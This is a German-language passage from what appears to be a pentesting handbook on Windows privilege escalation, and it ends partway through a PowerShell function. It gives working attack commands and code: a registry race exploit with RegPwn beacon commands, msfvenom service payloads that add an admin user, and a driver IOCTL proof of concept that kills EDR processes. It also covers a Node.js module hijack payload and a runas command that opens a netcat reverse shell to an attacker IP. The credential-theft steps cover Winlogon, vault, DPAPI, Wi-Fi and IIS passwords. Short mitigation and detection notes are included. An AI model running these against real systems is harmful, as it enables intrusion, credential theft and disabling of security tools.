- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzerkontrollierte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird während Logon/secure-desktop-Übergängen erstellt und ist für den Benutzer schreibbar.

Missbrauchsablauf (CVE-2026-24291 / ATConfig):

1. Fülle den **HKCU ATConfig**-Wert, der von SYSTEM geschrieben werden soll.
2. Triggert den secure-desktop copy (z. B. **LockWorkstation**), wodurch der AT broker flow startet.
3. **Gewinne das Race**, indem du einen **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt; wenn der oplock auslöst, ersetze den **HKLM Session ATConfig**-Key durch einen **registry link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebiges HKLM value write hast, pivotiere zu LPE, indem du Service-Konfigurationswerte überschreibst:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Service, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und triggere ihn nach dem Write. **Hinweis:** Die öffentliche Exploit-Implementierung **lockt die Workstation** als Teil des Races.

Beispiel-Tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Wenn Sie diese Berechtigung über eine Registry haben, bedeutet das, dass Sie **von dieser aus Sub-Registries erstellen können**. Bei Windows-Diensten ist das **ausreichend, um beliebigen Code auszuführen:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jede Endung vor einem Leerzeichen auszuführen.

Zum Beispiel wird Windows für den Pfad _C:\Program Files\Some Folder\Service.exe_ versuchen, Folgendes auszuführen:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste alle unquoted service paths auf, ausgenommen diejenigen, die zu den integrierten Windows-Services gehören:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Du kannst diese Schwachstelle** mit metasploit erkennen und ausnutzen: `exploit/windows/local/trusted\_service\_path` Du kannst manuell eine service binary mit metasploit erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows erlaubt Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binary verweist. Wenn diese Binary austauschbar ist, könnte eine Privilege Escalation möglich sein. Weitere Details finden sich in der [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Prüfe die **Berechtigungen der binaries** (vielleicht kannst du eine überschreiben und Privilegien eskalieren) und der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibberechtigungen

Prüfe, ob du eine Konfigurationsdatei ändern kannst, um eine spezielle Datei zu lesen, oder ob du ein Binary ändern kannst, das von einem Administrator-Konto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, ist:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ lädt automatisch jede Plugin-DLL unter seinen `plugins`-Unterordnern. Wenn eine beschreibbare portable/copy-Installation vorhanden ist, führt das Ablegen eines bösartigen Plugins bei jedem Start automatisch Code innerhalb von `notepad++.exe` aus (einschließlich von `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Prüfe, ob du eine Registry oder Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **autoruns locations to escalate privileges** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{endref}}

### Drivers

Suche nach möglichen **Third-Party weird/vulnerable** Treibern
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Wenn ein Treiber ein beliebiges Kernel Read/Write-Primitive bereitstellt (häufig bei schlecht entworfenen IOCTL-Handlern), kannst du eskalieren, indem du direkt aus dem Kernel-Speicher ein SYSTEM-Token stiehlst. Siehe die Schritt-für-Schritt-Technik hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object Manager-Pfad öffnet, kann absichtliches Verlangsamen der Suche (mit max-length-Komponenten oder tiefen Verzeichnisketten) das Zeitfenster von Mikrosekunden auf Dutzende Mikrosekunden ausdehnen:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Moderne Hive-Schwachstellen erlauben es, deterministische Layouts zu groomen, beschreibbare HKLM/HKU-Nachkommen auszunutzen und Metadatenbeschädigung in Kernel paged-pool overflows umzuwandeln, ganz ohne custom driver. Erfahre hier die vollständige Kette:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion aus vom Angreifer kontrollierten Pfaden

Einige Treiber akzeptieren einen Registry-Pfad aus dem Userland, validieren nur, dass es eine vernünftige UTF-16-Zeichenkette ist, und rufen dann `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` in einen Stack-Skalar wie `int readValue` auf. Wenn `RTL_QUERY_REGISTRY_TYPECHECK` fehlt, wird `EntryContext` entsprechend dem **tatsächlichen** Registry-Typ interpretiert, nicht dem Typ, den der Entwickler erwartet hat.

Das erzeugt zwei nützliche Primitive:

- **Confused deputy / oracle**: Ein vom Benutzer kontrollierter absoluter `\Registry\...`-Pfad erlaubt es dem Treiber, vom Angreifer gewählte Keys abzufragen, die Existenz über Return-Codes/Logs zu leaken und manchmal Werte zu lesen, auf die der Aufrufer direkt keinen Zugriff hätte.
- **Kernel memory corruption**: Ein Skalar-Ziel wie `&readValue` wird je nach Typ des Registry-Werts als `REG_QWORD`, `UNICODE_STRING` oder als Größen-begrenzter Binary-Buffer type-confused.

Praktische Exploitation-Notizen:

- **Windows 8+ mitigation**: Wenn die Abfrage auf eine **untrusted hive** mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK` trifft, crashen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Um die Ausnutzbarkeit zu erhalten, suche stattdessen nach **vom Angreifer beschreibbaren Keys innerhalb vertrauenswürdiger System-Hives** anstatt Werte unter `HKCU` zu platzieren.
- **Trusted-hive staging**: Verwende NtObjectManager, um beschreibbare Nachkommen von `\Registry\Machine` aufzulisten, und führe den Scan erneut mit einem duplizierten **low-integrity** Token aus, um Keys zu finden, die aus sandboxed contexts erreichbar sind:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: ein 8-Byte-Direct-Write in ein 4-Byte-`int` beschädigt angrenzende Stack-Daten und kann einen nahen Callback-/Function-Pointer teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Direct Mode erwartet, dass `EntryContext` auf eine `UNICODE_STRING` zeigt. Wenn der Code zuerst einen angreiferkontrollierten `REG_DWORD` in einen Stack-Scalar lädt und dann denselben Puffer für einen String-Read wiederverwendet, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst den `Buffer`-Pointer teilweise, was zu einem halbkontrollierten Kernel Write führt.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt Direct Mode das erste `LONG` bei `EntryContext` als signierte Buffer-Größe. Wenn ein vorheriger `REG_DWORD`-Read einen **negativen** angreiferkontrollierten Wert in der wiederverwendeten Scalar-Variable hinterlässt, kopiert die nächste `REG_BINARY`-Query Angreifer-Bytes direkt über angrenzende Stack-Slots, was oft der sauberste Weg zum vollständigen Callback-Pointer-Overwrite ist.

Starkes Hunting-Muster: **heterogene Registry-Reads in dieselbe Stack-Variable ohne Reinitialisierung**. Suche nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Pointern und Codepfaden, bei denen der erste Registry-Read steuert, ob ein zweiter Read passiert.

#### Ausnutzung von fehlendem FILE_DEVICE_SECURE_OPEN auf Device Objects (LPE + EDR kill)

Einige signierte Third-Party-Driver erstellen ihr Device Object mit einem starken SDDL über IoCreateDeviceSecure, setzen aber vergessen, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht erzwungen, wenn das Device über einen Pfad mit einer zusätzlichen Komponente geöffnet wird, sodass jeder unprivilegierte Benutzer einen Handle erhalten kann, indem er einen Namespace-Pfad wie diesen verwendet:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Device öffnen kann, können privilegierte IOCTLs, die vom Driver exponiert werden, für LPE und Manipulation missbraucht werden. Beobachtete Fähigkeiten in der Praxis:
- Gibt Handles mit vollem Zugriff auf beliebige Prozesse zurück (Token-Diebstahl / SYSTEM-Shell via DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränktes Rohlesen/-schreiben auf Disk (Offline-Manipulation, Boot-Time-Persistence-Tricks).
- Beendet beliebige Prozesse, einschließlich Protected Process/Light (PP/PPL), und ermöglicht so AV/EDR-Kill aus dem User Land via Kernel.

Minimales PoC-Muster (User Mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigationen für Entwickler
- Setze immer FILE_DEVICE_SECURE_OPEN, wenn du Device-Objekte erstellst, die durch eine DACL eingeschränkt werden sollen.
- Validiere den Caller-Kontext für privilegierte Operationen. Füge PP/PPL-Checks hinzu, bevor du das Beenden von Prozessen oder das Zurückgeben von Handles erlaubst.
- Begrenze IOCTLs (Access Masks, METHOD_*, Input-Validierung) und ziehe brokered Modelle statt direkter Kernel-Privilegien in Betracht.

Erkennungsideen für Verteidiger
- Überwache User-Mode-Öffnungen verdächtiger Device-Namen (z. B. \\ .\\amsdk*) und spezifische IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Erzwinge Microsofts vulnerable driver blocklist (HVCI/WDAC/Smart App Control) und pflege deine eigenen Allow-/Deny-Listen.


## PATH DLL Hijacking

Wenn du **Schreibrechte innerhalb eines Ordners auf PATH** hast, könntest du eine von einem Prozess geladene DLL hijacken und **Privilegien eskalieren**.

Prüfe die Berechtigungen aller Ordner innerhalb von PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Für weitere Informationen dazu, wie dieser Check missbraucht werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Dies ist eine **Windows uncontrolled search path**-Variante, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen bare import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.

Node löst Pakete auf, indem es die Verzeichnishierarchie nach oben durchläuft und in jedem Parent-Verzeichnis `node_modules`-Ordner prüft. Unter Windows kann dieser Lauf bis zur Laufwerkswurzel reichen, sodass eine Anwendung, die aus `C:\Users\Administrator\project\app.js` gestartet wird, am Ende Folgendes prüft:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Wenn ein **low-privileged user** `C:\node_modules` erstellen kann, kann er ein bösartiges `foo.js` (oder einen Paketordner) ablegen und warten, bis ein **höher privilegierter Node/Electron-Prozess** die fehlende Abhängigkeit auflöst. Der Payload wird im Sicherheitskontext des Opferprozesses ausgeführt, sodass dies zu **LPE** wird, wenn das Ziel als Administrator, aus einer erhöhten geplanten Aufgabe/einem Service-Wrapper oder aus einer automatisch gestarteten privilegierten Desktop-App heraus läuft.

Dies kommt besonders häufig vor, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist
- eine Third-Party-Bibliothek `require("foo")` in `try/catch` einbettet und bei einem Fehler fortfährt
- ein Paket aus Produktions-Builds entfernt, beim Packaging ausgelassen oder nicht installiert wurde
- das verwundbare `require()` tief im Abhängigkeitsbaum liegt statt im Hauptanwendungscode

### Verwundbare Ziele finden

Verwende **Procmon**, um den Auflösungspfad nachzuweisen:

- Filter auf `Process Name` = Ziel-Executable (`node.exe`, die Electron-App-EXE oder der Wrapper-Prozess)
- Filter auf `Path` `contains` `node_modules`
- Fokus auf `NAME NOT FOUND` und das letzte erfolgreiche Öffnen unter `C:\node_modules`

Nützliche Code-Review-Muster in entpackten `.asar`-Dateien oder Anwendung-Quellen:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Ausnutzung

1. Identifiziere den **fehlenden Paketnamen** mit Procmon oder durch Quellcode-Review.
2. Erstelle das Root-Lookup-Verzeichnis, falls es noch nicht existiert:
```powershell
mkdir C:\node_modules
```
3. Ein Modul mit genau dem erwarteten Namen ablegen:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Lösen Sie die Zielanwendung aus. Wenn die Anwendung `require("foo")` aufruft und das legitime Modul fehlt, kann Node `C:\node_modules\foo.js` laden.

Reale Beispiele für fehlende optionale Module, die diesem Muster entsprechen, sind `bluebird` und `utf-8-validate`, aber die **Technik** ist der wiederverwendbare Teil: Finden Sie jeden **fehlenden bare import**, den ein privilegierter Windows Node/Electron-Prozess auflösen wird.

### Detection and hardening ideas

- Alarmieren, wenn ein Benutzer `C:\node_modules` erstellt oder dort neue `.js`-Dateien/Packages schreibt.
- Suchen nach High-Integrity-Prozessen, die von `C:\node_modules\*` lesen.
- Paketieren Sie alle Runtime-Abhängigkeiten in der Produktion und prüfen Sie die Nutzung von `optionalDependencies`.
- Prüfen Sie Drittanbieter-Code auf stille `try { require("...") } catch {}`-Muster.
- Deaktivieren Sie optionale Probes, wenn die Library dies unterstützt (zum Beispiel können einige `ws`-Deployments den alten `utf-8-validate`-Probe mit `WS_NO_UTF_8_VALIDATE=1` umgehen).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Auf weitere bekannte Computer prüfen, die in der hosts file hartcodiert sind
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerk-Interfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Offene Ports

Prüfe von außen auf **eingeschränkte Dienste**
```bash
netstat -ano #Opened ports?
```
### Routing-Tabelle
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-Tabelle
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Prüfe diese Seite für Firewall-bezogene Befehle**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Mehr [Befehle für Netzwerk-Enumeration hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` kann auch in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` gefunden werden

Wenn du Root-User wirst, kannst du auf jedem Port lauschen (beim ersten Mal, wenn du `nc.exe` zum Lauschen auf einem Port verwendest, wird per GUI gefragt, ob `nc` von der Firewall erlaubt werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um bash einfach als root zu starten, kannst du `--default-user root` ausprobieren

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Das Windows Vault speichert Benutzeranmeldedaten für Server, Websites und andere Programme, bei denen sich **Windows** **automatisch bei den Benutzern anmelden** kann. Auf den ersten Blick könnte es so aussehen, als könnten Benutzer jetzt ihre Facebook-Anmeldedaten, Twitter-Anmeldedaten, Gmail-Anmeldedaten usw. speichern, sodass sie sich automatisch über Browser anmelden. Aber so ist es nicht.

Windows Vault speichert Anmeldedaten, mit denen Windows die Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldedaten benötigt, um auf eine Ressource** (Server oder Website) **zuzugreifen**, diesen Credential Manager und Windows Vault nutzen und die bereitgestellten Anmeldedaten verwenden kann, anstatt dass Benutzer ständig Benutzername und Passwort eingeben müssen.

Sofern die Anwendungen nicht mit Credential Manager interagieren, glaube ich nicht, dass es für sie möglich ist, die Anmeldedaten für eine bestimmte Ressource zu verwenden. Wenn deine Anwendung also den Vault nutzen möchte, sollte sie irgendwie **mit dem Credential Manager kommunizieren und die Anmeldedaten für diese Ressource anfordern** aus dem Standard-Storage-Vault.

Use `cmdkey`, um die auf dem Rechner gespeicherten Anmeldedaten aufzulisten.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dann kannst du `runas` mit den Optionen `/savecred` verwenden, um die gespeicherten Anmeldedaten zu nutzen. Das folgende Beispiel ruft eine Remote-Binärdatei über eine SMB-Freigabe auf.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldeinformationen.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder aus dem [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird vor allem im Windows-Betriebssystem für die symmetrische Verschlüsselung asymmetrischer privater Schlüssel verwendet. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um die Entropie deutlich zu erhöhen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Anmeldesecrets des Benutzers abgeleitet wird**. In Szenarien mit Systemverschlüsselung verwendet sie die Domänenauthentifizierungsgeheimnisse des Systems.

Verschlüsselte Benutzer-RSA-Schlüssel werden mit DPAPI im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` die [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master Key liegt, der die privaten Schlüssel des Benutzers in derselben Datei schützt**, besteht typischerweise aus 64 Bytes Zufallsdaten. (Wichtig ist, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, sodass sein Inhalt nicht mit dem `dir`-Befehl in CMD aufgelistet werden kann, jedoch über PowerShell.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Sie können das **mimikatz module** `dpapi::masterkey` mit den passenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **credentials files, die durch das master password geschützt sind**, befinden sich normalerweise in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Sie können das **mimikatz module** `dpapi::cred` mit dem passenden `/masterkey` zum Entschlüsseln verwenden.\
Sie können viele DPAPI-**masterkeys** mit dem Modul `sekurlsa::dpapi` aus dem **memory** extrahieren (wenn Sie root sind).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** werden häufig für **scripting**- und Automatisierungsaufgaben verwendet, um verschlüsselte credentials bequem zu speichern. Die credentials sind mit **DPAPI** geschützt, was normalerweise bedeutet, dass sie nur vom selben user auf demselben computer entschlüsselt werden können, auf dem sie erstellt wurden.

Um eine PS credentials aus der Datei, die sie enthält, zu **decrypt**en, können Sie Folgendes tun:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Du findest sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
und in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Kürzlich ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use das **Mimikatz** `dpapi::rdg`-Modul mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Du kannst viele DPAPI-Masterkeys aus dem Speicher mit dem Mimikatz-`sekurlsa::dpapi`-Modul extrahieren

### Sticky Notes

Viele Nutzer verwenden die StickyNotes-App auf Windows-Workstations, um **Passwörter** und andere Informationen zu speichern, ohne zu wissen, dass es sich um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und lohnt sich immer, gesucht und untersucht zu werden.

### AppCmd.exe

**Beachte, dass du, um Passwörter aus AppCmd.exe wiederherzustellen, Administrator sein und unter einem High-Integrity-Level ausführen musst.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei existiert, dann ist es möglich, dass einige **credentials** konfiguriert wurden und **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
